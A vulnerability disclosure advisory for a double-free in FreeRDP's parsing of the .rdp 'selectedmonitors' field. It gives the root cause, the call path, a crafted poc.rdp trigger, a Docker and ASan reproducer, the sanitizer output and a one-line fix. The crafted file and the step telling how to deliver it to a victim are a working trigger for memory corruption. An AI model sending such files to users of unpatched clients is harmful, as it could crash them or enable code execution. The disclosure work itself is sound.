<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-XQVPKKPB -->

# ANT-2026-XQVPKKPB · freerdp/freerdp

## double-free high

[CVE-2026-64621](https://nvd.nist.gov/vuln/detail/CVE-2026-64621)
[GHSA-f27x-frr8-j9hc](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-f27x-frr8-j9hc)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.

# ANT-2026-XQVPKKPB: Double-free of MonitorIds when parsing malformed selectedmonitors

In client/common/file.c, freerdp\_client\_rdp\_file\_apply\_to\_settings() obtains a raw (non-copied) pointer to settings->MonitorIds via freerdp\_settings\_get\_pointer\_writable() and, on the strtoul-overflow error path at line 2536, calls free(list) on that buffer without clearing the owning settings->MonitorIds pointer. When the error propagates up, freerdp\_settings\_free() later frees the same buffer again via freerdp\_settings\_set\_pointer\_len() in libfreerdp/common/settings.c:1442-1443. The attacker controls the freed chunk size through the number of comma-separated tokens preceding the overflowing value, and numerous heap operations occur between the two frees, enabling chunk recycling and an overlapping-allocation primitive rather than an immediate tcache abort. The only precondition is that the victim opens a crafted .rdp file, a well-known untrusted distribution vector parsed directly from argv.

**Project:** freerdp/freerdp
**Location:** `client/common/file.c:2536`

freerdp\_settings\_get\_pointer\_writable() returns the raw settings->MonitorIds pointer (settings\_getters.c:4145-4146), not a copy, so ownership remains with the settings object. When a selectedmonitors token overflows strtoul (val >= UINT32\_MAX with errno set), the error branch at file.c:2536 calls free(list) directly and returns FALSE, but settings->MonitorIds still points to the freed memory. During client teardown (freerdp\_client\_context\_free → rdp\_free → freerdp\_settings\_free → freerdp\_settings\_free\_keys), the dangling MonitorIds pointer is passed to free() a second time at libfreerdp/common/settings.c:1442-1443, producing a double-free.

1. Craft a .rdp file containing e.g. `selectedmonitors:s:99999999999999999999999` (optionally preceded by N comma-separated tokens to control chunk size).
2. Deliver the .rdp file to the victim (phishing/download); FreeRDP parses .rdp files directly from argv (cmdline.c:5693).
3. During parsing, strtoul overflows (ULONG\_MAX with errno=ERANGE), hitting the `(val >= UINT32_MAX) && (errno != 0)` branch which calls free(list) on the live settings->MonitorIds buffer and returns FALSE.
4. The error propagates up and the client calls freerdp\_client\_context\_free → freerdp\_settings\_free, which frees the dangling MonitorIds pointer a second time at settings.c:1442-1443.
5. Intervening heap activity (freerdp\_client\_rdp\_file\_free string frees, status printing, ContextFree callbacks) recycles the chunk between the two frees, yielding an overlapping-allocation primitive.

## Suggested Fix

On parse failure do not free buffers still owned by the settings object: replace free(list) with freerdp\_settings\_set\_pointer\_len(settings, FreeRDP\_MonitorIds, nullptr, 0), or clear settings->MonitorIds before freeing so the destructor releases it exactly once.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-XQVPKKPB.

---

**Reference:** ANT-2026-XQVPKKPB

Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.

## Summary

When a FreeRDP client opens a `.rdp` connection file, `freerdp_client_rdp_file_apply_to_settings()`
(`client/common/file.c`) parses the `selectedmonitors` field into `settings->MonitorIds`.
It allocates that array through the settings object, then takes a **raw, non-owning**
pointer to it via `freerdp_settings_get_pointer_writable()`. On the `strtoul`-overflow
error path it calls `free(list)` on that raw pointer **without clearing
`settings->MonitorIds`**. The parse fails, the client tears down its `rdpSettings`, and
`freerdp_settings_free()` frees the same now-dangling buffer a **second time** — an
attacker-influenced double-free (CWE-415).

The attacker controls the freed chunk's size (number of comma-separated tokens), and there
is substantial heap activity between the two frees, so this is a size-controlled
double-free / overlapping-allocation primitive rather than a benign immediate abort. It is
reachable in the **default** configuration of every FreeRDP CLI client
(`xfreerdp` / `sdl-freerdp` / `wlfreerdp`) by getting a victim to open an
attacker-supplied `.rdp` file.

## Affected versions

* **FreeRDP 3.x** — present in the latest release tag **3.27.1** (and 3.27.0) and on
  **`master`** (HEAD `1f7a716d39b5605bb8a83b0c3c97a6ce386609ef`, reproduced 2026-07-01).
  Unpatched. `free(list)` on the `MonitorIds` error path is at `client/common/file.c:2536`
  in all of them. (No `stable-3.0` branch exists; 3.x ships as tags off `master`, and the
  bug is in the released 3.27.1 tag — so it is not dev-branch-only.)
* No special build flags required (stock `client-common`).

## Details

### Vulnerable code

`client/common/file.c`, `freerdp_client_rdp_file_apply_to_settings()`:

```
if (~(size_t)file->SelectedMonitors)
    size_t count = 0;
    char** ptr = CommandLineParseCommaSeparatedValues(file->SelectedMonitors, &count);
    UINT32* list = nullptr;

    if (!freerdp_settings_set_pointer_len(settings, FreeRDP_MonitorIds, nullptr, count)) // (1) settings->MonitorIds = calloc(count,4)
    { CommandLineParserFree(ptr); return FALSE; }

    list = freerdp_settings_get_pointer_writable(settings, FreeRDP_MonitorIds);          // (2) RAW pointer == settings->MonitorIds (NOT a copy)
    if (!list && (count > 0)) { CommandLineParserFree(ptr); return FALSE; }

    for (size_t x = 0; x < count; x++)
        unsigned long val = 0;
        errno = 0;
        val = strtoul(ptr[x], nullptr, 0);
        if ((val >= UINT32_MAX) && (errno != 0))
            CommandLineParserFree(ptr);
            free(list);                        // (3) file.c:2536 — frees settings->MonitorIds; owning field NOT cleared
            return FALSE;
        list[x] = (UINT32)val;
    CommandLineParserFree(ptr);
```

`freerdp_settings_get_pointer_writable(FreeRDP_MonitorIds)` returns `settings->MonitorIds`
verbatim (`settings_getters.c`), so `list` **is** the settings-owned allocation. `free(list)`
at file.c:2536 leaves `settings->MonitorIds` dangling.

At teardown, `freerdp_settings_free → freerdp_settings_free_internal → freerdp_settings_free_keys`
walks each pointer field and calls `freerdp_settings_set_pointer_len(..., FreeRDP_MonitorIds, NULL, 0)`,
which reaches:

```
// libfreerdp/common/settings.c:1375-1382 — freerdp_settings_set_pointer_len_()
void* old = freerdp_settings_get_pointer_writable(settings, id);   // the dangling MonitorIds
free(old);                                                         // settings.c:1382 — SECOND free
```

The overflow trigger is reliable: for a token like `99999999999999999999999`, `strtoul`
returns `ULONG_MAX` (`>= UINT32_MAX`) and sets `errno = ERANGE` (`!= 0`), satisfying the
error condition.

### Root cause

The error path frees a buffer still owned by `settings->MonitorIds` without nulling the
owning field, breaking the single-owner invariant `freerdp_settings_free()` relies on.

### Server-independent call path (from the CLI entry point)

```
main(argv = {"xfreerdp","poc.rdp"})
  freerdp_client_settings_parse_command_line_arguments        client/common/cmdline.c:6011
    ..._int  (option_is_rdp_file(argv[1]) -> connection-file path)  cmdline.c:5719
      freerdp_client_settings_parse_connection_file            client/common/client.c:385
        freerdp_client_populate_settings_from_rdp_file(_unchecked)  client/common/file.c:2726
          free(list)                                           client/common/file.c:2536   <-- FIRST free
  ...parse returns error...
  freerdp_settings_free(settings)
    freerdp_settings_free_keys -> freerdp_settings_set_pointer_len_  common/settings.c:1382  <-- SECOND free
```

## Impact

A single crafted `.rdp` file, opened by the victim with any FreeRDP CLI client in the
default build, double-frees a heap chunk whose size the attacker selects (via token count).
Because the client performs substantial heap activity between the two frees (freeing the
many parsed `.rdp` string fields, context teardown, status printing), the freed chunk can
be recycled before the second free on a real glibc heap — turning a tcache double-free
abort into an overlapping-allocation (aliasing) primitive. Full RCE on a hardened allocator
is plausible but not demonstrated; this is a size-controlled double-free reachable from an
untrusted file with no CFI-bypass shown → **High**. No authentication; requires the victim
to open the file (normal usage for connection files).

## Proof of Concept

Self-contained Docker reproducer. It builds `libfreerdp` + `winpr` + `client-common` under
AddressSanitizer at the affected commit, and a small consumer that invokes the **exact
public top-level parser the shipped CLI clients call from `main()`** —
`freerdp_client_settings_parse_command_line_arguments(settings, {"xfreerdp","poc.rdp"})` —
then frees the settings object on the parse error, exactly as the clients do on teardown.
(The library API is used only to avoid the X11/SDL/network layers irrelevant to `.rdp`
parsing; the code path, frames, and ownership are identical to `xfreerdp poc.rdp`.)

**`poc.rdp`**

```
full address:s:127.0.0.1:3389
selectedmonitors:s:0,1,2,99999999999999999999999
```

**`Dockerfile`**

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=1f7a716d39b5605bb8a83b0c3c97a6ce386609ef
ARG CLANG_VERSION=20

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake ninja-build pkg-config libc6-dev \
        wget gnupg lsb-release software-properties-common \
        libssl-dev zlib1g-dev libicu-dev libcjson-dev \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-${CLANG_VERSION} CXX=clang++-${CLANG_VERSION}
ENV CFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV CXXFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV LDFLAGS="-fsanitize=address"

RUN git clone https://github.com/freerdp/freerdp /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

# libfreerdp + winpr + client-common (where the bug lives), ASan, shared libs, LTO off,
# no GUI clients / no server.
RUN cmake -GNinja -S /src/repo -B /build \
        -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_INTERPROCEDURAL_OPTIMIZATION=OFF \
        -DCMAKE_C_COMPILER=clang-${CLANG_VERSION} -DCMAKE_CXX_COMPILER=clang++-${CLANG_VERSION} \
        -DCMAKE_C_FLAGS="$CFLAGS" -DCMAKE_CXX_FLAGS="$CXXFLAGS" \
        -DCMAKE_EXE_LINKER_FLAGS="$LDFLAGS" -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_INSTALL_PREFIX=/usr/local -DBUILD_SHARED_LIBS=ON -DBUILD_TESTING=OFF \
        -DWITH_SAMPLE=OFF -DWITH_SERVER=OFF -DWITH_CLIENT=OFF -DWITH_CLIENT_COMMON=ON \
        -DWITH_CLIENT_SDL=OFF -DWITH_X11=OFF -DWITH_WAYLAND=OFF \
        -DWITH_PULSE=OFF -DWITH_CUPS=OFF -DWITH_PCSC=OFF -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF \
        -DWITH_OPUS=OFF -DWITH_KRB5=OFF -DWITH_GSSAPI=OFF -DWITH_FUSE=OFF \
        -DWITH_URBDRC=OFF -DCHANNEL_URBDRC=OFF -DWITH_DRIVE=OFF -DWITH_VIDEO_FFMPEG=OFF \
    && cmake --build /build && cmake --install /build
RUN ldconfig

COPY harness.c /tmp/harness.c
COPY poc.rdp /tmp/poc.rdp
RUN $CC $CFLAGS -I/usr/local/include -I/usr/local/include/freerdp3 -I/usr/local/include/winpr3 \
        /tmp/harness.c -o /tmp/poc_run \
        -L/usr/local/lib -lfreerdp-client3 -lfreerdp3 -lwinpr3 $LDFLAGS

ENV LD_LIBRARY_PATH=/usr/local/lib
ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-${CLANG_VERSION}/bin/llvm-symbolizer
CMD ["/bin/sh","-c","/tmp/poc_run /tmp/poc.rdp 2>&1; echo EXIT=$?"]
```

**`harness.c`** — drives the exact CLI parser + teardown

```
/* Real consumer of the FreeRDP client library: drives the exact public entry point the
 * shipped CLI clients invoke from main(), with argv = {"xfreerdp","<file.rdp>"}. The parser
 * detects the ".rdp" extension and routes to freerdp_client_rdp_file_apply_to_settings(),
 * where the malformed selectedmonitors token overflows strtoul and the error branch at
 * client/common/file.c:2536 free()s the live settings->MonitorIds without clearing the
 * owning pointer. Client teardown (freerdp_settings_free) then frees it a second time. */
#include <stdio.h>
#include <freerdp/client.h>
#include <freerdp/client/cmdline.h>
#include <freerdp/settings.h>

int main(int argc, char** argv)
    const char* rdp = (argc > 1) ? argv[1] : "/tmp/poc.rdp";

    rdpSettings* settings = freerdp_settings_new(0);
    if (!settings) { fprintf(stderr, "freerdp_settings_new failed\n"); return 2; }

    char prog[] = "xfreerdp";
    char file[4096];
    snprintf(file, sizeof(file), "%s", rdp);
    char* av[] = { prog, file, NULL };

    int rc = freerdp_client_settings_parse_command_line_arguments(settings, 2, av, FALSE);
    fprintf(stderr, "parse_command_line_arguments returned %d (error expected)\n", rc);

    /* Client teardown: settings->MonitorIds was already free()'d on the error path
     * -> second free here. */
    freerdp_settings_free(settings);
    fprintf(stderr, "settings freed cleanly (NO double-free detected)\n");
    return 0;
```

**Run**

```
docker build -t freerdp-monitorids-doublefree .
docker run --rm freerdp-monitorids-doublefree
```

**Observed output (AddressSanitizer, current `master` `1f7a716d`)**

```
parse_command_line_arguments returned -1002 (error expected)
==7==ERROR: AddressSanitizer: attempting double-free on 0x7b8df67fef50 in thread T0:
    #1 freerdp_settings_set_pointer_len_ /src/repo/libfreerdp/common/settings.c:1382:2
    #2 freerdp_settings_free_keys        /src/repo/libfreerdp/common/settings_str.c:348:10
    #4 freerdp_settings_free             /src/repo/libfreerdp/core/settings.c:1397:2
    #5 main                              /tmp/harness.c:50:2
0x7b8df67fef50 is located 0 bytes inside of 16-byte region [...]
freed by thread T0 here:
    #1 freerdp_client_populate_settings_from_rdp_file_unchecked /src/repo/client/common/file.c:2536:5
    ... freerdp_client_settings_parse_command_line_arguments    .../cmdline.c:6011
previously allocated by thread T0 here:
    #1 freerdp_settings_set_pointer_len_ /src/repo/libfreerdp/common/settings.c:1395:9
    #2 freerdp_client_populate_settings_from_rdp_file_unchecked /src/repo/client/common/file.c:2517:8
SUMMARY: AddressSanitizer: double-free /src/repo/libfreerdp/common/settings.c:1382 in freerdp_settings_set_pointer_len_
EXIT=134
```

The three stacks show the same 16-byte chunk allocated at settings.c:1395 (from file.c:2517),
freed first at file.c:2536, and freed again at settings.c:1382 during `freerdp_settings_free`.

## Suggested fix

Do not free a buffer still owned by the settings object — release it through the settings
API so the owning field is cleared and the destructor frees it exactly once:

```
--- a/client/common/file.c
+++ b/client/common/file.c
@@ freerdp_client_rdp_file_apply_to_settings()
             if ((val >= UINT32_MAX) && (errno != 0))
                 CommandLineParserFree(ptr);
-                free(list);
+                /* settings still owns this buffer; clear it through the API so the
+                   destructor frees it exactly once. Do not free the raw getter result. */
+                freerdp_settings_set_pointer_len(settings, FreeRDP_MonitorIds, NULL, 0);
                 return FALSE;
```

**Fix-verified:** with this one-line change, the same PoC completes cleanly
(`settings freed cleanly (NO double-free detected)`, `EXIT=0`) — the ASan double-free no
longer fires (`freerdp_settings_set_pointer_len` frees the current `MonitorIds` and sets the
pointer to NULL / length 0, so teardown frees nothing).

## References

* `client/common/file.c` — `freerdp_client_rdp_file_apply_to_settings()` (`free(list)` at :2536; alloc at :2517).
* `libfreerdp/common/settings.c:1375-1382` (`freerdp_settings_set_pointer_len_` second free); `settings_str.c` (teardown walk); `settings_getters.c` (`get_pointer_writable` returns the raw field).
* `client/common/client.c` (`parse_connection_file`), `client/common/cmdline.c` (`option_is_rdp_file`, top-level parser).
* CWE-415 (Double Free).

## Attribution

please credit **Claude** and **Ada Logics** — found by Anthropic using agents
to study the security of open-source projects, with Ada Logics validating and reporting.

## Disclosure

This report follows a 90-day coordinated disclosure timeline as per https://www.anthropic.com/coordinated-vulnerability-disclosure

```
diff --git a/client/common/file.c b/client/common/file.c
index dc8af42fb1ba..dcd17899de0a 100644
--- a/client/common/file.c
+++ b/client/common/file.c
@@ -2533,7 +2533,6 @@ BOOL freerdp_client_populate_settings_from_rdp_file_unchecked(const rdpFile* fil
 			if ((val >= UINT32_MAX) && (errno != 0))
 				CommandLineParserFree(ptr);
-				free(list);
 				return FALSE;
 			list[x] = (UINT32)val;
```

<https://github.com/FreeRDP/FreeRDP/commit/7696267929ae8ba045c1bbe275b3915653828313>

1. 2026-04-02
2. 2026-07-06
3. 2026-07-22
4. 2026-07-22
5. 2026-09-28

3a90d073b15799d00f35445781c7d4cf2389ac6ed3dd751727e154c08ea2410bce55fabefc0ad71899fc5da0bcae17903a01978dcda2025fd15c999cc8c35adb

Committed 2026-07-22 07:29 UTC

Revealed 2026-09-28 21:48 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-XQVPKKPB%22%2C%22bug_class%22%3A%22Double%20Free%20/%20Memory%20Corruption%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A41%2B00%3A00%22%2C%22description%22%3A%22In%20client/common/file.c%2C%20freerdp_client_rdp_file_apply_to_settings%28%29%20obtains%20a%20raw%20%28non-copied%29%20pointer%20to%20settings-%3EMonitorIds%20via%20freerdp_settings_get_pointer_writable%28%29%20and%2C%20on%20the%20strtoul-overflow%20error%20path%20at%20line%202536%2C%20calls%20free%28list%29%20on%20that%20buffer%20without%20clearing%20the%20owning%20settings-%3EMonitorIds%20pointer.%20When%20the%20error%20propagates%20up%2C%20freerdp_settings_free%28%29%20later%20frees%20the%20same%20buffer%20again%20via%20freerdp_settings_set_pointer_len%28%29%20in%20libfreerdp/common/settings.c%3A1442-1443.%20The%20attacker%20controls%20the%20freed%20chunk%20size%20through%20the%20number%20of%20comma-separated%20tokens%20preceding%20the%20overflowing%20value%2C%20and%20numerous%20heap%20operations%20occur%20between%20the%20two%20frees%2C%20enabling%20chunk%20recycling%20and%20an%20overlapping-allocation%20primitive%20rather%20than%20an%20immediate%20tcache%20abort.%20The%20only%20precondition%20is%20that%20the%20victim%20opens%20a%20crafted%20.rdp%20file%2C%20a%20well-known%20untrusted%20distribution%20vector%20parsed%20directly%20from%20argv.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22client/common/file.c%3A2536%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Craft%20a%20.rdp%20file%20containing%20e.g.%20%60selectedmonitors%3As%3A99999999999999999999999%60%20%28optionally%20preceded%20by%20N%20comma-separated%20tokens%20to%20control%20chunk%20size%29.%22%2C%222.%20Deliver%20the%20.rdp%20file%20to%20the%20victim%20%28phishing/download%29%3B%20FreeRDP%20parses%20.rdp%20files%20directly%20from%20argv%20%28cmdline.c%3A5693%29.%22%2C%223.%20During%20parsing%2C%20strtoul%20overflows%20%28ULONG_MAX%20with%20errno%3DERANGE%29%2C%20hitting%20the%20%60%28val%20%3E%3D%20UINT32_MAX%29%20%26%26%20%28errno%20%21%3D%200%29%60%20branch%20which%20calls%20free%28list%29%20on%20the%20live%20settings-%3EMonitorIds%20buffer%20and%20returns%20FALSE.%22%2C%224.%20The%20error%20propagates%20up%20and%20the%20client%20calls%20freerdp_client_context_free%20%E2%86%92%20freerdp_settings_free%2C%20which%20frees%20the%20dangling%20MonitorIds%20pointer%20a%20second%20time%20at%20settings.c%3A1442-1443.%22%2C%225.%20Intervening%20heap%20activity%20%28freerdp_client_rdp_file_free%20string%20frees%2C%20status%20printing%2C%20ContextFree%20callbacks%29%20recycles%20the%20chunk%20between%20the%20two%20frees%2C%20yielding%20an%20overlapping-allocation%20primitive.%22%5D%2C%22technical_details%22%3A%22freerdp_settings_get_pointer_writable%28%29%20returns%20the%20raw%20settings-%3EMonitorIds%20pointer%20%28settings_getters.c%3A4145-4146%29%2C%20not%20a%20copy%2C%20so%20ownership%20remains%20with%20the%20settings%20object.%20When%20a%20selectedmonitors%20token%20overflows%20strtoul%20%28val%20%3E%3D%20UINT32_MAX%20with%20errno%20set%29%2C%20the%20error%20branch%20at%20file.c%3A2536%20calls%20free%28list%29%20directly%20and%20returns%20FALSE%2C%20but%20settings-%3EMonitorIds%20still%20points%20to%20the%20freed%20memory.%20During%20client%20teardown%20%28freerdp_client_context_free%20%E2%86%92%20rdp_free%20%E2%86%92%20freerdp_settings_free%20%E2%86%92%20freerdp_settings_free_keys%29%2C%20the%20dangling%20MonitorIds%20pointer%20is%20passed%20to%20free%28%29%20a%20second%20time%20at%20libfreerdp/common/settings.c%3A1442-1443%2C%20producing%20a%20double-free.%22%2C%22title%22%3A%22Double-free%20of%20MonitorIds%20when%20parsing%20malformed%20selectedmonitors%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-XQVPKKPB",
  "bug_class": "Double Free / Memory Corruption",
  "created_at": "2026-04-16T01:52:41+00:00",
  "description": "In client/common/file.c, freerdp_client_rdp_file_apply_to_settings() obtains a raw (non-copied) pointer to settings->MonitorIds via freerdp_settings_get_pointer_writable() and, on the strtoul-overflow error path at line 2536, calls free(list) on that buffer without clearing the owning settings->MonitorIds pointer. When the error propagates up, freerdp_settings_free() later frees the same buffer again via freerdp_settings_set_pointer_len() in libfreerdp/common/settings.c:1442-1443. The attacker controls the freed chunk size through the number of comma-separated tokens preceding the overflowing value, and numerous heap operations occur between the two frees, enabling chunk recycling and an overlapping-allocation primitive rather than an immediate tcache abort. The only precondition is that the victim opens a crafted .rdp file, a well-known untrusted distribution vector parsed directly from argv.",
  "discovered_at": "2026-04-02T00:00:00+00:00",
  "location": "client/common/file.c:2536",
  "project": "freerdp/freerdp",
    "1. Craft a .rdp file containing e.g. `selectedmonitors:s:99999999999999999999999` (optionally preceded by N comma-separated tokens to control chunk size).",
    "2. Deliver the .rdp file to the victim (phishing/download); FreeRDP parses .rdp files directly from argv (cmdline.c:5693).",
    "3. During parsing, strtoul overflows (ULONG_MAX with errno=ERANGE), hitting the `(val >= UINT32_MAX) && (errno != 0)` branch which calls free(list) on the live settings->MonitorIds buffer and returns FALSE.",
    "4. The error propagates up and the client calls freerdp_client_context_free → freerdp_settings_free, which frees the dangling MonitorIds pointer a second time at settings.c:1442-1443.",
    "5. Intervening heap activity (freerdp_client_rdp_file_free string frees, status printing, ContextFree callbacks) recycles the chunk between the two frees, yielding an overlapping-allocation primitive."
  "technical_details": "freerdp_settings_get_pointer_writable() returns the raw settings->MonitorIds pointer (settings_getters.c:4145-4146), not a copy, so ownership remains with the settings object. When a selectedmonitors token overflows strtoul (val >= UINT32_MAX with errno set), the error branch at file.c:2536 calls free(list) directly and returns FALSE, but settings->MonitorIds still points to the freed memory. During client teardown (freerdp_client_context_free → rdp_free → freerdp_settings_free → freerdp_settings_free_keys), the dangling MonitorIds pointer is passed to free() a second time at libfreerdp/common/settings.c:1442-1443, producing a double-free.",
  "title": "Double-free of MonitorIds when parsing malformed selectedmonitors",
```
